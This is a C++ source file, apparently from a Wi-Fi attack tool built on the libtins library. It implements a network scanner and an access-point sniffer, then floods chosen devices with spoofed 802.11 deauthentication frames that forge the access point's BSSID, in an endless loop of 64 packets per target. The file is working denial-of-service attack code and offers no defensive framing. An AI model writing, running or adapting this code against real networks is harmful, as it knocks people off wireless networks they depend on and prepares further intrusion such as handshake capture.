#include <boost/algorithm/string.hpp>
#include <codecvt>
#include <iostream>
#include <thread>
#include <tins/icmp.h>
#include <zconf.h>

#include "Network.h"

using namespace Tins;

Network::Network() {}

Network::~Network() {}

void
Network::sendDeauth()
{
    Tins::Dot11Deauthentication deauthPacket;
    Tins::RadioTap radio;
    PacketSender sender;
    while (deauthing) {
        for (auto target : targets) {
            if (!deauthing)
                break;
            deauthPacket = Dot11Deauthentication(target.second, spoofedBSSID);
            deauthPacket.addr1(spoofedBSSID); // Set the BSSID
            deauthPacket.addr2(target.second);
            deauthPacket.addr3(spoofedBSSID); // Set the BSSID
            deauthPacket.reason_code(0x0007); // From airplay-ng
            radio = RadioTap() / deauthPacket;
            for (int i = 0; i < 64; ++i) {  // Spam
                sender.send(radio, spoofingIfaceName);
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
            }
        }
    }
}

void
Network::startDeauth()
{
    Tins::NetworkInterface spoofedIface(spoofingIfaceName);
    if (!spoofedIface.ipv4_address()) {
        std::cout << "[!] Interface " << spoofingIfaceName
                  << " does not have an IPv4 address! Trying on the default iface..." << std::endl;
                  //<< "[!] Exiting..." << std::endl;
        //exit(1);
        spoofingIfaceName = NetworkInterface::default_interface().name();
    }
    deauthing = true;
    deauthThread = std::thread(&Network::sendDeauth, this);
}

void
Network::stopDeauth()
{
    deauthing = false;
    deauthThread.join();
}

// TODO: Filter out non 802.11 interfaces
std::vector<std::wstring>
Network::getInterfaces()
{
    std::vector<std::wstring> interfacesNames;
    // First fetch all network interfaces
    std::vector<NetworkInterface> interfaces = NetworkInterface::all();
    // Now iterate them
    for (const NetworkInterface& iface : interfaces) {
        interfacesNames.push_back(iface.friendly_name());
    }

    return interfacesNames;
}

void
Network::scanDevices(Tins::PacketSender& sender, std::string iprange)
{
    auto networkRange = AddressRange<IPv4Address>::from_mask(
      defaultIface.ipv4_address(), defaultIface.ipv4_mask());
    if (!iprange.empty()) {
        // TODO: Validate the range
        int delimiter_pos = iprange.find("/");
        std::string base = iprange.substr(0, delimiter_pos);
        int mask = std::stoi(
          iprange.substr(delimiter_pos + 1, iprange.length() - delimiter_pos));
        networkRange = IPv4Address(base) / mask;
    } else {
        std::cout << "[*] Using " << defaultIface.ipv4_address().to_string()
                  << " / " << defaultIface.ipv4_mask().to_string() << std::endl;
    }
    NetworkInterface::Info infoScanner = defaultIface.info();
    IP ping;
    for (const auto& target : networkRange) {
        ping = IP(target, infoScanner.ip_addr) / ICMP();
        sender.send(ping, defaultIface);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    ipScanning = false;
    ping = IP(targets.begin()->first, infoScanner.ip_addr) / ICMP();
    sender.send(ping, defaultIface);
}

bool
Network::ipScanCallback(Tins::PDU& pdu)
{
    const EthernetII& eth = pdu.rfind_pdu<EthernetII>();
    const IP& ip = pdu.rfind_pdu<IP>();
    const ICMP& icmp = pdu.rfind_pdu<ICMP>();
    if (icmp.type() == ICMP::ECHO_REPLY) {
        // todo: don't add if already in the map
        if (targets.find(ip.src_addr()) == targets.end()) {
            std::cout << "\t-> " << ip.src_addr().to_string() << " ("
                << eth.src_addr().to_string() << ")" << std::endl;
            targets.insert(std::pair<Tins::IPv4Address, Tins::HWAddress<6>>(
                        ip.src_addr(), eth.src_addr()));
        }
    }
    return ipScanning;
}

int
Network::getConnectedDevices(std::string iprange)
{
    SnifferConfiguration config;
    std::cout << "[*] Running IP scan on default interface "
              << defaultIface.name() << std::endl;
    config.set_promisc_mode(false);
    config.set_filter("ip proto \\icmp and not src host " +
                      defaultIface.addresses().ip_addr.to_string());
    Sniffer sniffer(defaultIface.name(), config);

    PacketSender sender;
    auto handler = bind(&Network::ipScanCallback, this, std::placeholders::_1);
    ipScanning = true;
    std::thread sniff_thread([&]() { sniffer.sniff_loop(handler); });
    scanDevices(sender, iprange);
    sniff_thread.join();

    return targets.size();
}

std::map<std::string, std::set<Dot11::address_type>>
Network::getAccessPoints()
{
    SnifferConfiguration config;
    config.set_promisc_mode(true);
    config.set_filter("type mgt subtype beacon");
    config.set_rfmon(true);
    Sniffer sniffer(spoofingIfaceName, config);

    apScanning = true;
    std::thread sniff_thread([&]() {
            sniffer.sniff_loop(make_sniffer_handler(this, &Network::apScanCallback));
    });
    sniff_thread.detach();
    std::this_thread::sleep_for(std::chrono::seconds(10));
    apScanning = false;
    return accessPoints;
}

bool
Network::apScanCallback(PDU& pdu)
{
    // Get the Dot11 layer
    const Dot11Beacon& beacon = pdu.rfind_pdu<Dot11Beacon>();
    // All beacons must have from_ds == to_ds == 0
    if (!beacon.from_ds() && !beacon.to_ds()) {
        // Get the AP address
        address_type addr = beacon.addr2();
        // Look it up in our set
        ssids_type::iterator it = ssids.find(addr);
        if (it == ssids.end()) {
            // First time we encounter this BSSID.
            try {
                /* If no ssid option is set, then Dot11::ssid will throw
                 * a std::runtime_error.
                 */
                std::string ssid = beacon.ssid();
                // Save it so we don't show it again.
                ssids.insert(addr);
                // Display the tuple "address - ssid".
                if (!ssid.empty()) {
                    if (accessPoints.count(ssid)) {
                        std::set<Dot11::address_type> addresses =
                          accessPoints[ssid];
                        addresses.insert(addr);
                        accessPoints[ssid] = addresses;
                    } else {
                        std::set<Dot11::address_type> addresses;
                        addresses.insert(addr);
                        accessPoints.insert(std::make_pair(ssid, addresses));
                    }
                }
            } catch (std::runtime_error&) {
                // No ssid, just ignore it.
            }
        }
    }
    return apScanning;
}

void
Network::setSpoofingInterface(std::string interface)
{
    spoofingIfaceName = interface;
}

void
Network::setBssid(const HWAddress<6> hwAddress)
{
    spoofedBSSID = hwAddress;
}

std::string
Network::getBssid()
{
    return spoofedBSSID.to_string();
}
